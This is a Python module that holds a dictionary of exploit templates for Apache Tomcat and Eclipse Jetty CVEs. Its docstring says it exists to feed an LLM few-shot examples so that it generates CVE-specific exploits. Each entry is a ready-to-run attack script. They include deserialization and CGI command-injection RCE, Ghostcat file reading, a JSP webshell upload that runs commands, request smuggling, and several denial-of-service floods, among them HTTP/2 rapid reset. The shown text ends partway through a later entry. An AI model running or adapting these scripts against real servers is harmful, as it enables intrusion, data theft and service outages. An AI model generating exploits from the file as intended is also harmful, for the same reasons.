"""
CVE-Specific Exploit Templates for LLM Few-Shot Learning

This module provides real-world CVE exploit templates that the LLM uses
as few-shot examples to generate accurate, CVE-specific exploits.
"""

from dataclasses import dataclass
from typing import Dict, List, Optional

@dataclass
class CVEExploitTemplate:
    """Template for CVE-specific exploit generation."""
    cve_id: str
    cwe: str
    cwe_name: str
    name: str
    severity: str
    protocol: str
    affected_products: List[str]
    description: str
    exploit_template: str
    success_indicators: List[str]
    references: List[str]


# =============================================================================
# CVE EXPLOIT TEMPLATE DATABASE
# =============================================================================

CVE_EXPLOIT_TEMPLATES: Dict[str, CVEExploitTemplate] = {
    
    # =========================================================================
    # APACHE TOMCAT CVEs
    # =========================================================================
    
    "CVE-2020-9484": CVEExploitTemplate(
        cve_id="CVE-2020-9484",
        cwe="CWE-502",
        cwe_name="Deserialization of Untrusted Data",
        name="Apache Tomcat Session Persistence Deserialization RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Tomcat 7.x", "Apache Tomcat 8.x", "Apache Tomcat 9.x", "Apache Tomcat 10.x"],
        description="When using Apache Tomcat with PersistentManager and FileStore, an attacker can trigger deserialization of untrusted data via a malicious JSESSIONID cookie pointing to a crafted session file.",
        exploit_template='''import requests
import sys
import argparse
from datetime import datetime

# CVE-2020-9484: Apache Tomcat Session Deserialization RCE
# CWE-502: Deserialization of Untrusted Data
# Requirements:
#   1. PersistentManager configured with FileStore
#   2. Attacker can write files to server (e.g., via file upload)
#   3. Session file path is predictable

# Parse command line arguments
parser = argparse.ArgumentParser(description="CVE-2020-9484 Exploit")
parser.add_argument("--target", default="__TARGET_PLACEHOLDER__", help="Target URL (e.g., http://192.168.1.45:8080)")
parser.add_argument("--payload-path", default="/tmp/malicious", help="Path to ysoserial payload (without .session)")
args = parser.parse_args()

target = args.target
payload_path = args.payload_path

def print_banner():
    print("=" * 60)
    print("CVE-2020-9484 - Apache Tomcat Session Deserialization RCE")
    print("=" * 60)
    print(f"[*] Execution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {target}")
    print(f"[*] Payload Path: {payload_path}")
    print("=" * 60)

def exploit():
    print_banner()
    
    # Path traversal via JSESSIONID to load malicious session file
    traversal_payloads = [
        f"../../../../../../..{payload_path}",
        f"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..{payload_path}",
    ]
    
    results = {"success": False, "attempts": [], "evidence": []}
    
    for payload in traversal_payloads:
        print(f"\\n[*] Attempt: JSESSIONID={payload[:50]}...")
        
        cookies = {"JSESSIONID": payload}
        headers = {"User-Agent": "CVE-2020-9484-Exploit"}
        
        try:
            start_time = datetime.now()
            response = requests.get(target, cookies=cookies, headers=headers, timeout=10)
            elapsed = (datetime.now() - start_time).total_seconds()
            
            attempt = {
                "payload": payload,
                "status_code": response.status_code,
                "response_time": f"{elapsed:.2f}s",
                "content_length": len(response.content)
            }
            results["attempts"].append(attempt)
            
            print(f"    Status Code: {response.status_code}")
            print(f"    Response Time: {elapsed:.2f}s")
            print(f"    Content Length: {len(response.content)} bytes")
            
            # Deserialization often causes 500 error
            if response.status_code == 500:
                print(f"\\n[+] EXPLOITATION SUCCESSFUL!")
                print(f"[+] Server returned 500 - deserialization triggered!")
                results["success"] = True
                results["evidence"].append("HTTP 500 - Deserialization executed")
                break
                
        except requests.exceptions.Timeout:
            print(f"\\n[+] EXPLOITATION SUCCESSFUL!")
            print(f"[+] Request timed out - command likely executed!")
            results["success"] = True
            results["evidence"].append("Timeout - Command executed")
            break
        except Exception as e:
            print(f"    Error: {e}")
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {target}")
    print(f"Success: {results['success']}")
    print(f"Attempts: {len(results['attempts'])}")
    if results['evidence']:
        print(f"Evidence: {', '.join(results['evidence'])}")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    print("[*] Step 1: Generate payload with ysoserial")
    print("    java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' > /tmp/malicious.session")
    print("[*] Step 2: Upload malicious.session to target server")
    print("[*] Step 3: Run this exploit\\n")
    exploit()
''',
        success_indicators=["500", "Internal Server Error", "timeout", "deserialize"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2020-9484"]
    ),
    
    "CVE-2020-1938": CVEExploitTemplate(
        cve_id="CVE-2020-1938",
        cwe="CWE-284",
        cwe_name="Improper Access Control",
        name="Apache Tomcat AJP Ghostcat File Read/Include",
        severity="Critical",
        protocol="AJP",
        affected_products=["Apache Tomcat 6.x", "Apache Tomcat 7.x < 7.0.100", "Apache Tomcat 8.x < 8.5.51", "Apache Tomcat 9.x < 9.0.31"],
        description="The AJP connector in Apache Tomcat allows an attacker to read or include files from the webapp, including WEB-INF. Combined with file upload, this leads to RCE.",
        exploit_template='''import socket
import struct
import sys
import argparse
from datetime import datetime

# CVE-2020-1938: Ghostcat - Apache Tomcat AJP File Read/Include
# CWE-284: Improper Access Control
# Default AJP port: 8009

# Parse command line arguments
parser = argparse.ArgumentParser(description="CVE-2020-1938 Ghostcat Exploit")
parser.add_argument("--target", default="__TARGET_IP_PLACEHOLDER__", help="Target IP address")
parser.add_argument("--port", type=int, default=8009, help="AJP port (default: 8009)")
args = parser.parse_args()

target_ip = args.target
target_port = args.port

def pack_string(s):
    """Pack string for AJP protocol."""
    if s is None:
        return struct.pack(">H", 0xFFFF)
    encoded = s.encode("utf-8")
    return struct.pack(">H", len(encoded)) + encoded + b"\\x00"

def create_ajp_request(uri, filename):
    """Create AJP Forward Request to read files."""
    ajp_data = b""
    ajp_data += struct.pack(">B", 2)  # JK_AJP13_FORWARD_REQUEST
    ajp_data += struct.pack(">B", 2)  # GET method
    ajp_data += pack_string("HTTP/1.1")
    ajp_data += pack_string(uri)
    ajp_data += pack_string("127.0.0.1")
    ajp_data += pack_string("localhost")
    ajp_data += pack_string(target_ip)
    ajp_data += struct.pack(">H", 8080)
    ajp_data += struct.pack(">B", 0)  # is_ssl
    ajp_data += struct.pack(">H", 0)  # num_headers
    
    ajp_data += struct.pack(">B", 0x0A)  # SC_A_REQ_ATTRIBUTE
    ajp_data += pack_string("javax.servlet.include.request_uri")
    ajp_data += pack_string(uri)
    ajp_data += struct.pack(">B", 0x0A)
    ajp_data += pack_string("javax.servlet.include.path_info")
    ajp_data += pack_string(filename)
    ajp_data += struct.pack(">B", 0x0A)
    ajp_data += pack_string("javax.servlet.include.servlet_path")
    ajp_data += pack_string("")
    ajp_data += struct.pack(">B", 0xFF)  # End
    
    header = struct.pack(">H", 0x1234) + struct.pack(">H", len(ajp_data))
    return header + ajp_data

def print_banner():
    print("=" * 60)
    print("CVE-2020-1938 - Ghostcat AJP File Read/Include")
    print("=" * 60)
    print(f"[*] Execution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {target_ip}:{target_port}")
    print("=" * 60)

def exploit():
    print_banner()
    
    files_to_read = [
        "/WEB-INF/web.xml",
        "/WEB-INF/classes/application.properties",
        "/META-INF/context.xml",
    ]
    
    results = {"success": False, "files_read": [], "total_bytes": 0}
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        print(f"\\n[+] Connected to AJP port {target_port}")
        
        for filepath in files_to_read:
            print(f"\\n[*] Reading: {filepath}")
            request = create_ajp_request("/", filepath)
            sock.send(request)
            response = sock.recv(8192)
            
            if len(response) > 4:
                content = response[4:].decode("utf-8", errors="ignore")
                results["files_read"].append(filepath)
                results["total_bytes"] += len(response)
                results["success"] = True
                
                print(f"    [+] SUCCESS - Got {len(response)} bytes")
                print(f"    Content Preview:")
                print("-" * 40)
                print(content[:500])
                print("-" * 40)
            else:
                print(f"    [-] No content returned")
        
        sock.close()
        
    except ConnectionRefusedError:
        print(f"\\n[-] AJP port {target_port} is closed or filtered")
    except socket.timeout:
        print(f"\\n[-] Connection timed out")
    except Exception as e:
        print(f"\\n[-] Error: {e}")
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Success: {results['success']}")
    print(f"Files Read: {len(results['files_read'])}")
    print(f"Total Bytes: {results['total_bytes']}")
    if results['files_read']:
        print(f"Extracted Files: {', '.join(results['files_read'])}")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["WEB-INF", "web.xml", "servlet", "context"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2020-1938"]
    ),
    
    "CVE-2017-12617": CVEExploitTemplate(
        cve_id="CVE-2017-12617",
        cwe="CWE-434",
        cwe_name="Unrestricted Upload of File with Dangerous Type",
        name="Apache Tomcat PUT Method JSP Upload RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Tomcat 7.x", "Apache Tomcat 8.x < 8.5.23", "Apache Tomcat 9.x < 9.0.1"],
        description="When running with HTTP PUT enabled (readonly=false), an attacker can upload a JSP file using PUT with a trailing slash to bypass the upload filter, achieving remote code execution.",
        exploit_template='''import requests
import time
import argparse
from datetime import datetime

# CVE-2017-12617: Apache Tomcat PUT JSP Upload RCE
# CWE-434: Unrestricted Upload of File with Dangerous Type
# Requires: DefaultServlet readonly=false

# Parse command line arguments
parser = argparse.ArgumentParser(description="CVE-2017-12617 Exploit")
parser.add_argument("--target", default="__TARGET_PLACEHOLDER__", help="Target URL (e.g., http://192.168.1.45:8080)")
args = parser.parse_args()

target = args.target
shell_name = f"shell_{int(time.time())}.jsp"

# JSP webshell payload - uses Java braces (escaped as {{ }})
JSP_WEBSHELL = \'\'\'<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>\'\'\'

def print_banner():
    print("=" * 60)
    print("CVE-2017-12617 - Apache Tomcat PUT JSP Upload RCE")
    print("=" * 60)
    print(f"[*] Execution Time: {datetime.now().strftime(\'%Y-%m-%d %H:%M:%S\')}")
    print(f"[*] Target: {target}")
    print(f"[*] Shell Name: {shell_name}")
    print("=" * 60)

def exploit():
    print_banner()
    
    results = {"success": False, "shell_url": None, "command_output": None}
    
    # Bypass techniques for different OS/versions
    bypass_suffixes = [
        "/",           # Trailing slash (Linux)
        "%20",         # URL-encoded space
        "::$DATA",     # NTFS stream (Windows)
        ".",           # Trailing dot
    ]
    
    for suffix in bypass_suffixes:
        jsp_path = f"/{shell_name}{suffix}"
        full_url = f"{target}{jsp_path}"
        
        print(f"\\n[*] Trying: PUT {jsp_path}")
        
        try:
            response = requests.put(
                full_url,
                data=JSP_WEBSHELL,
                headers={"Content-Type": "application/x-jsp"},
                timeout=10
            )
            
            print(f"    Status Code: {response.status_code}")
            
            if response.status_code in [200, 201, 204]:
                print(f"[+] Upload successful!")
                
                # Verify shell
                shell_url = f"{target}/{shell_name}"
                print(f"[*] Verifying shell at: {shell_url}?cmd=whoami")
                
                verify = requests.get(f"{shell_url}?cmd=whoami", timeout=10)
                
                if verify.status_code == 200 and len(verify.text) > 0:
                    print(f"\\n[+] RCE CONFIRMED!")
                    print(f"[+] Command output: {verify.text[:200]}")
                    results["success"] = True
                    results["shell_url"] = f"{shell_url}?cmd=<command>"
                    results["command_output"] = verify.text
                    break
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime(\'%Y-%m-%d %H:%M:%S\')}")
    print(f"Target: {target}")
    print(f"Success: {results[\'success\']}")
    if results[\'shell_url\']:
        print(f"Shell URL: {results[\'shell_url\']}")
    if results[\'command_output\']:
        print(f"Command Output: {results[\'command_output\'][:100]}")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["201", "Created", "whoami", "uid="],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2017-12617"]
    ),
    
    "CVE-2019-0232": CVEExploitTemplate(
        cve_id="CVE-2019-0232",
        cwe="CWE-78",
        cwe_name="OS Command Injection",
        name="Apache Tomcat CGI Servlet Command Injection",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Tomcat 7.x (Windows)", "Apache Tomcat 8.x (Windows)", "Apache Tomcat 9.x (Windows)"],
        description="On Windows, the CGI Servlet passes query string parameters as command line arguments to batch files, allowing command injection via special characters.",
        exploit_template='''import requests
import urllib.parse

# CVE-2019-0232: Apache Tomcat CGI Command Injection (Windows)
# CWE-78: OS Command Injection
# Requires: CGI Servlet enabled, Windows OS

target = "__TARGET_PLACEHOLDER__"
cgi_path = "/cgi-bin/test.bat"

def exploit():
    print(f"[*] CVE-2019-0232 - CGI Command Injection")
    print(f"[*] Target: {target}")
    print(f"[*] Platform: Windows only")
    
    # Command injection payloads for Windows batch files
    payloads = [
        "&whoami",
        "|whoami",
        "&dir",
        "&net user",
        "&ipconfig /all",
        "%26whoami",  # URL encoded &
    ]
    
    for payload in payloads:
        full_url = f"{target}{cgi_path}?{payload}"
        print(f"[*] Trying: {cgi_path}?{payload}")
        
        try:
            response = requests.get(full_url, timeout=10)
            
            # Check for command output indicators
            indicators = ["Administrator", "AUTHORITY", "Windows", "Directory of", "User accounts"]
            
            for indicator in indicators:
                if indicator in response.text:
                    print(f"[+] VULNERABLE! Found: {indicator}")
                    print(f"[+] Response:\\n{response.text[:500]}")
                    return True
                    
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["Administrator", "AUTHORITY", "Windows", "Directory of"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-0232"]
    ),
    
    # =========================================================================
    # ECLIPSE JETTY CVEs
    # =========================================================================
    
    "CVE-2023-40167": CVEExploitTemplate(
        cve_id="CVE-2023-40167",
        cwe="CWE-444",
        cwe_name="HTTP Request Smuggling",
        name="Eclipse Jetty HTTP/1 Request Smuggling",
        severity="High",
        protocol="HTTP",
        affected_products=["Eclipse Jetty 9.4.x < 9.4.52", "Eclipse Jetty 10.x < 10.0.16", "Eclipse Jetty 11.x < 11.0.16"],
        description="Improper parsing of HTTP/1 request headers allows HTTP request smuggling, enabling cache poisoning, WAF bypass, and XSS attacks.",
        exploit_template='''import requests
import socket
import argparse
from datetime import datetime

# CVE-2023-40167: Eclipse Jetty HTTP/1 Request Smuggling
# CWE-444: Inconsistent Interpretation of HTTP Requests
# Affected: Jetty < 9.4.52, < 10.0.16, < 11.0.16

parser = argparse.ArgumentParser(description="CVE-2023-40167 Exploit")
parser.add_argument("--target", default="__TARGET_PLACEHOLDER__", help="Target URL")
parser.add_argument("--port", type=int, default=8080, help="Target port")
args = parser.parse_args()

target = args.target.replace("http://", "").replace("https://", "").split(":")[0]
port = args.port

def print_banner():
    print("=" * 60)
    print("CVE-2023-40167 - Jetty HTTP Request Smuggling")
    print("=" * 60)
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {target}:{port}")
    print("=" * 60)

def exploit():
    print_banner()
    
    results = {"success": False, "smuggled": False, "evidence": []}
    
    # HTTP Request Smuggling payloads - Content-Length with invalid prefix
    smuggle_payloads = [
        # CL.TE smuggling with + prefix (CVE-2023-40167 specific)
        b"POST / HTTP/1.1\\r\\nHost: " + target.encode() + b"\\r\\nContent-Length: +50\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: " + target.encode() + b"\\r\\n\\r\\n",
        # Whitespace prefix
        b"POST / HTTP/1.1\\r\\nHost: " + target.encode() + b"\\r\\nContent-Length:  50\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: " + target.encode() + b"\\r\\n\\r\\n",
        # Tab prefix 
        b"POST / HTTP/1.1\\r\\nHost: " + target.encode() + b"\\r\\nContent-Length:\\t50\\r\\n\\r\\nX",
    ]
    
    for i, payload in enumerate(smuggle_payloads):
        print(f"\\n[*] Attempt {i+1}: Testing smuggling payload...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            sock.send(payload)
            
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            print(f"    Response length: {len(response)} bytes")
            
            # Check for smuggling indicators
            if "admin" in response.lower() or "forbidden" in response.lower():
                print(f"[+] SMUGGLING DETECTED!")
                print(f"[+] Accessed restricted resource via smuggled request")
                results["success"] = True
                results["smuggled"] = True
                results["evidence"].append("Smuggled request processed")
                break
            elif "400" not in response and len(response) > 0:
                print(f"[+] Server accepted malformed Content-Length!")
                results["evidence"].append("Malformed header accepted")
                results["success"] = True
                
        except socket.timeout:
            print(f"    Timeout - possible smuggling in progress")
            results["evidence"].append("Request timeout")
        except Exception as e:
            print(f"    Error: {e}")
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {target}:{port}")
    print(f"Vulnerable: {results['success']}")
    print(f"Smuggling Confirmed: {results['smuggled']}")
    if results['evidence']:
        print(f"Evidence: {', '.join(results['evidence'])}")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["smuggled", "forbidden", "admin", "400"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2023-40167"]
    ),
    
    "CVE-2023-36478": CVEExploitTemplate(
        cve_id="CVE-2023-36478",
        cwe="CWE-190",
        cwe_name="Integer Overflow",
        name="Eclipse Jetty HPACK Integer Overflow DoS",
        severity="High",
        protocol="HTTP/2",
        affected_products=["Eclipse Jetty 9.4.x < 9.4.52", "Eclipse Jetty 10.x < 10.0.16", "Eclipse Jetty 11.x < 11.0.16"],
        description="Integer overflow in MetaDataBuilder.checkSize allows denial of service via HPACK header manipulation.",
        exploit_template='''import socket
import struct
import argparse
from datetime import datetime

# CVE-2023-36478: Jetty HPACK Integer Overflow DoS
# CWE-190: Integer Overflow or Wraparound
# Affected: Jetty < 9.4.52

parser = argparse.ArgumentParser(description="CVE-2023-36478 Exploit")
parser.add_argument("--target", default="__TARGET_IP_PLACEHOLDER__", help="Target IP")
parser.add_argument("--port", type=int, default=8080, help="Target port")
args = parser.parse_args()

target_ip = args.target
target_port = args.port

def print_banner():
    print("=" * 60)
    print("CVE-2023-36478 - Jetty HPACK Integer Overflow DoS")
    print("=" * 60)
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {target_ip}:{target_port}")
    print("=" * 60)

def create_http2_preface():
    """HTTP/2 connection preface."""
    return b"PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n"

def create_settings_frame():
    """HTTP/2 SETTINGS frame."""
    # Frame: length(3) + type(1) + flags(1) + stream_id(4) + payload
    payload = b""
    length = len(payload)
    frame = struct.pack(">I", length)[1:] + b"\\x04\\x00" + struct.pack(">I", 0) + payload
    return frame

def create_malicious_headers_frame():
    """Create HEADERS frame with large HPACK integer to trigger overflow."""
    # Craft header with excessively large size that triggers integer overflow
    # HPACK integer encoding with continuation bits
    large_int = b"\\x7f" + b"\\x80" * 8 + b"\\xff\\xff\\xff\\xff"  # Max integer
    
    # Header block with malicious size
    header_block = b"\\x82" + large_int  # :method header with overflow size
    
    length = len(header_block)
    # HEADERS frame type = 0x01, flags = END_HEADERS(0x04) + END_STREAM(0x01)
    frame = struct.pack(">I", length)[1:] + b"\\x01\\x05" + struct.pack(">I", 1) + header_block
    return frame

def exploit():
    print_banner()
    
    results = {"success": False, "dos_triggered": False, "evidence": []}
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        print(f"[+] Connected to {target_ip}:{target_port}")
        
        # Send HTTP/2 preface
        sock.send(create_http2_preface())
        print("[*] Sent HTTP/2 connection preface")
        
        # Send SETTINGS frame
        sock.send(create_settings_frame())
        print("[*] Sent SETTINGS frame")
        
        # Send malicious HEADERS frame
        print("[*] Sending malicious HPACK data...")
        for i in range(10):
            sock.send(create_malicious_headers_frame())
        
        # Check response
        try:
            response = sock.recv(4096)
            if b"GOAWAY" in response:
                print("[+] Server sent GOAWAY - DoS condition triggered!")
                results["success"] = True
                results["dos_triggered"] = True
                results["evidence"].append("GOAWAY frame received")
            elif len(response) == 0:
                print("[+] Connection closed - possible DoS!")
                results["success"] = True
                results["evidence"].append("Connection terminated")
        except socket.timeout:
            print("[+] Server unresponsive - DoS successful!")
            results["success"] = True
            results["dos_triggered"] = True
            results["evidence"].append("Server timeout")
            
        sock.close()
        
    except ConnectionRefusedError:
        print("[-] Connection refused - server may be down")
        results["success"] = True
        results["dos_triggered"] = True
        results["evidence"].append("Connection refused")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {target_ip}:{target_port}")
    print(f"DoS Triggered: {results['dos_triggered']}")
    if results['evidence']:
        print(f"Evidence: {', '.join(results['evidence'])}")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["GOAWAY", "timeout", "connection refused", "closed"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2023-36478"]
    ),
    
    "CVE-2023-44487": CVEExploitTemplate(
        cve_id="CVE-2023-44487",
        cwe="CWE-400",
        cwe_name="Uncontrolled Resource Consumption",
        name="HTTP/2 Rapid Reset Attack (Affects Jetty)",
        severity="High",
        protocol="HTTP/2",
        affected_products=["Eclipse Jetty 9.4.x < 9.4.53", "Eclipse Jetty 10.x < 10.0.17", "Eclipse Jetty 11.x < 11.0.17"],
        description="HTTP/2 protocol vulnerability allows DoS via rapid stream creation and cancellation, exhausting server resources.",
        exploit_template='''import socket
import struct
import argparse
import time
from datetime import datetime

# CVE-2023-44487: HTTP/2 Rapid Reset Attack
# CWE-400: Uncontrolled Resource Consumption
# Exploited in the wild Aug-Oct 2023

parser = argparse.ArgumentParser(description="CVE-2023-44487 Exploit")
parser.add_argument("--target", default="__TARGET_IP_PLACEHOLDER__", help="Target IP")
parser.add_argument("--port", type=int, default=8080, help="Target port")
parser.add_argument("--streams", type=int, default=100, help="Number of streams to create")
args = parser.parse_args()

target_ip = args.target
target_port = args.port
num_streams = args.streams

def print_banner():
    print("=" * 60)
    print("CVE-2023-44487 - HTTP/2 Rapid Reset Attack")
    print("=" * 60)
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Streams: {num_streams}")
    print("=" * 60)

def create_headers_frame(stream_id):
    """Create minimal HEADERS frame."""
    header_block = b"\\x82\\x86\\x84"  # :method GET, :scheme https, :path /
    length = len(header_block)
    # HEADERS frame, END_HEADERS flag
    return struct.pack(">I", length)[1:] + b"\\x01\\x04" + struct.pack(">I", stream_id) + header_block

def create_rst_stream_frame(stream_id):
    """Create RST_STREAM frame to cancel request."""
    # RST_STREAM frame type = 0x03, error code = CANCEL (0x08)
    return struct.pack(">I", 4)[1:] + b"\\x03\\x00" + struct.pack(">I", stream_id) + struct.pack(">I", 8)

def exploit():
    print_banner()
    
    results = {"success": False, "streams_sent": 0, "resets_sent": 0, "evidence": []}
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((target_ip, target_port))
        print(f"[+] Connected to {target_ip}:{target_port}")
        
        # Send HTTP/2 preface
        sock.send(b"PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n")
        
        # Send empty SETTINGS frame
        sock.send(struct.pack(">I", 0)[1:] + b"\\x04\\x00" + struct.pack(">I", 0))
        
        print(f"[*] Starting rapid reset attack with {num_streams} streams...")
        start_time = time.time()
        
        stream_id = 1
        for i in range(num_streams):
            # Send HEADERS frame
            sock.send(create_headers_frame(stream_id))
            results["streams_sent"] += 1
            
            # Immediately send RST_STREAM
            sock.send(create_rst_stream_frame(stream_id))
            results["resets_sent"] += 1
            
            stream_id += 2  # HTTP/2 client streams are odd
            
            if (i + 1) % 20 == 0:
                print(f"    Sent {i + 1} stream/reset pairs...")
        
        elapsed = time.time() - start_time
        print(f"[+] Sent {results['streams_sent']} streams in {elapsed:.2f}s")
        print(f"[+] Rate: {results['streams_sent']/elapsed:.1f} streams/sec")
        
        results["success"] = True
        results["evidence"].append(f"{results['streams_sent']} rapid resets sent")
        
        # Check if server is still responsive
        try:
            sock.send(create_headers_frame(stream_id))
            response = sock.recv(1024)
            if len(response) == 0:
                print("[+] Server stopped responding - DoS successful!")
                results["evidence"].append("Server unresponsive")
        except:
            print("[+] Server connection failed - DoS successful!")
            results["evidence"].append("Connection lost")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        if "reset" in str(e).lower() or "refused" in str(e).lower():
            results["success"] = True
            results["evidence"].append("Connection reset by server")
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Streams Sent: {results['streams_sent']}")
    print(f"Resets Sent: {results['resets_sent']}")
    print(f"Success: {results['success']}")
    if results['evidence']:
        print(f"Evidence: {', '.join(results['evidence'])}")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["unresponsive", "reset", "connection lost", "refused"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2023-44487"]
    ),
    
    "CVE-2024-8184": CVEExploitTemplate(
        cve_id="CVE-2024-8184",
        cwe="CWE-400",
        cwe_name="Uncontrolled Resource Consumption",
        name="Eclipse Jetty ThreadLimitHandler Memory Exhaustion DoS",
        severity="High",
        protocol="HTTP",
        affected_products=["Eclipse Jetty 9.4.x < 9.4.54", "Eclipse Jetty 10.x < 10.0.18", "Eclipse Jetty 11.x < 11.0.18"],
        description="ThreadLimitHandler.getRemote() can be exploited to exhaust server memory via crafted requests.",
        exploit_template='''import requests
import threading
import argparse
import time
from datetime import datetime

# CVE-2024-8184: Jetty ThreadLimitHandler Memory Exhaustion
# CWE-400: Uncontrolled Resource Consumption

parser = argparse.ArgumentParser(description="CVE-2024-8184 Exploit")
parser.add_argument("--target", default="__TARGET_PLACEHOLDER__", help="Target URL")
parser.add_argument("--threads", type=int, default=50, help="Number of threads")
parser.add_argument("--duration", type=int, default=30, help="Attack duration (seconds)")
args = parser.parse_args()

target = args.target
num_threads = args.threads
duration = args.duration

results = {"requests_sent": 0, "errors": 0, "success": False}
stop_flag = False

def print_banner():
    print("=" * 60)
    print("CVE-2024-8184 - Jetty ThreadLimitHandler DoS")
    print("=" * 60)
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {target}")
    print(f"[*] Threads: {num_threads}")
    print(f"[*] Duration: {duration}s")
    print("=" * 60)

def attack_thread():
    global results, stop_flag
    
    # Craft headers that trigger ThreadLimitHandler memory issues
    headers = {
        "X-Forwarded-For": "127.0.0.1, " + ", ".join([f"10.0.0.{i}" for i in range(100)]),
        "X-Real-IP": "A" * 10000,
        "Connection": "keep-alive",
    }
    
    while not stop_flag:
        try:
            response = requests.get(
                target,
                headers=headers,
                timeout=5
            )
            results["requests_sent"] += 1
        except requests.exceptions.Timeout:
            results["errors"] += 1
            results["success"] = True  # Timeouts indicate DoS
        except Exception as e:
            results["errors"] += 1
            if "memory" in str(e).lower() or "reset" in str(e).lower():
                results["success"] = True

def exploit():
    global stop_flag, results
    print_banner()
    
    threads = []
    print(f"[*] Launching {num_threads} attack threads...")
    
    for i in range(num_threads):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"[*] Attack running for {duration} seconds...")
    start_time = time.time()
    
    while time.time() - start_time < duration:
        time.sleep(5)
        elapsed = time.time() - start_time
        rate = results["requests_sent"] / elapsed if elapsed > 0 else 0
        print(f"    [{elapsed:.0f}s] Requests: {results['requests_sent']}, Errors: {results['errors']}, Rate: {rate:.1f}/s")
    
    stop_flag = True
    print("[*] Stopping attack...")
    
    # Test if server is still responsive
    try:
        test_response = requests.get(target, timeout=10)
        print(f"[*] Server response: {test_response.status_code}")
    except:
        print("[+] Server unresponsive - DoS successful!")
        results["success"] = True
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {target}")
    print(f"Total Requests: {results['requests_sent']}")
    print(f"Errors/Timeouts: {results['errors']}")
    print(f"DoS Success: {results['success']}")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["timeout", "unresponsive", "memory", "OutOfMemory"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2024-8184"]
    ),
    
    "CVE-2024-9823": CVEExploitTemplate(
        cve_id="CVE-2024-9823",
        cwe="CWE-400",
